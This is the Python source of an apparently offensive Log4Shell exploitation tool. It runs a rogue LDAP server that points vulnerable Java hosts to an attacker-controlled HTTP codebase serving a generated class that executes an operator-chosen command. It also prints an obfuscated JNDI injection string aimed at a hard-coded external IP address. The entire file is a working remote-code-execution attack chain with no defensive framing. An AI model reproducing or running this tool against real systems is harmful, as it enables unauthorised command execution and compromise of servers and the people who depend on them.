import time
import socket
import random
import multiprocessing
from datetime import datetime

from termcolor import colored
from PyInquirer import prompt

from constants import CLASS_NAMES, LOGO
from utils import LDAPResponse, load_previous_promt, save_prompt

from generate import generate_exploit
from server import exploit_server

def run(host, port, hport):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(('0.0.0.0', port))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()

            with conn as c:
                try:
                    timestamp = datetime.now().ctime()
                    print(colored(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green"))
                    
                    c.recv(8096)
                    c.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")

                    time.sleep(0.5)

                    query = c.recv(8096)

                    if not query or len(query) < 10:
                        print("[-] Connection Suspended")
                        return

                    command = prompt([
                        {
                            'type': 'input',
                            'name': 'command',
                            'message': 'Enter the command:',
                        },
                    ])['command']

                    print(colored("[!] Command was sent succefully.\n", "green"))

                    class_name = random.choice(CLASS_NAMES)
                    
                    generate_exploit(command, class_name)

                    query_name = query[9:9+query[8:][0]].decode()

                    response = LDAPResponse(query_name, {
                        "javaClassName": class_name, 
                        "javaCodeBase": f"http://{host}:{hport}/", 
                        "objectClass": "javaNamingReference", 
                        "javaFactory": class_name
                    })

                    c.sendall(response.serialize())

                    time.sleep(0.5)

                    c.recv(8096)
                except:
                    print(colored('[!] Unable to exploit the connection.\n', 'red'))
                finally:
                    c.close()

if __name__ == "__main__":
    # Show logo
    print(colored(LOGO, 'red'))

    q, l = None, False

    if load_previous_promt():
        c = prompt([
            {
                'type': 'confirm',
                'name': 'load',
                'message': 'Do you want to load the previous parameters?',
            }
        ])['load']

        if c:
            q = load_previous_promt()
            l = True 


    if not l:
        # Prompt the questions
        q = prompt([
            {
                'type': 'input',
                'name': 'host',
                'message': 'Enter your IP Host:',
            },
            {
                'type': 'input',
                'name': 'ldap_port',
                'message': 'Enter the LDAP port:',
            },
            {
                'type': 'input',
                'name': 'http_port',
                'message': 'Enter the HTTP port:',
            }
        ])

        save_prompt(q)

    # transform port to number
    q['ldap_port'] = int(q['ldap_port'])
    q['http_port'] = int(q['http_port'])

    web = multiprocessing.Process(target=exploit_server, args=(q['http_port'],))
    web.start()

    print(colored(f"\n[i] Use the payload: ${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap${{env:NaN:-:}}//67.205.191.9:2000/Exploit}}\n", "blue"))

    print(colored('[*] Waiting for a connection... Press CTRL + C to exit.\n', 'yellow'))

    run(q['host'], q['ldap_port'], q['http_port'])

    web.kill()

    print(colored("[*] Bye bye!", "red"))